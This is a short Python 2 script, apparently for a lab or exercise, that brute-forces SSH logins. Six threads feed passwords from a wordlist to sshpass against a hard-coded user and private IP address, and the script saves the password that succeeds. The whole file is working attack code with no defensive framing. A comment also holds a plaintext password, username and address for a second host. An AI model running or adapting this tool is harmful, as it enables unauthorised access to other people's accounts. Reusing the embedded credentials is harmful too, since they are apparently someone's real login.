#!/usr/bin/env python

# coding=utf-8
# 32-126 : 20-7E
# Queue: https://www.troyfawkes.com/learn-python-multithreading-queues-basics/
import thread
import threading
import commands

p = 1
USERNAME = "chrisb14"
IP_ADRESS = "172.16.0.30"
PORT = "22"
new_results = []
correct_pw = ""
cracked = bool(False)
counter = 0
# sshpass -p bkdrugis ssh Sigurdkb@10.225.147.156 -p 2222

def connect_ssh():
        global correct_pw
        global cracked

        while cracked == False:
            pw = get_next_pw()
            result = commands.getoutput("sshpass -p " +  pw + " ssh "+ USERNAME + "@" + IP_ADRESS + " -p " + PORT)

            if result.__contains__("Permission denied"):
                print "Password try: " + pw
            elif result.__contains__("Welcome") & result.__contains__("Ubuntu"):
                print "Correct password: " + pw
                correct_pw = pw
                f = open("correct_pw.txt", 'w')
                f.write(correct_pw)
                thread.interrupt_main()
                cracked = True

            else:
                print "Passord som gav nytt resultat: " + pw
                print " Output: " + result
                new_results.append(pw)
                print new_results





def get_next_pw():
    global counter

    f = open("wordlist.txt", "r")
    line = f.readlines()[counter]
    counter += 1
    return line.strip('\n')


def main():

    t1 = threading.Thread(target=connect_ssh)
    t2 = threading.Thread(target=connect_ssh)
    t3 = threading.Thread(target=connect_ssh)
    t4 = threading.Thread(target=connect_ssh)
    t5 = threading.Thread(target=connect_ssh)
    t6 = threading.Thread(target=connect_ssh)

    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()
    t6.start()

    t1.join()
    t2.join()
    t3.join()
    t4.join()
    t5.join()
    t6.join()


main()



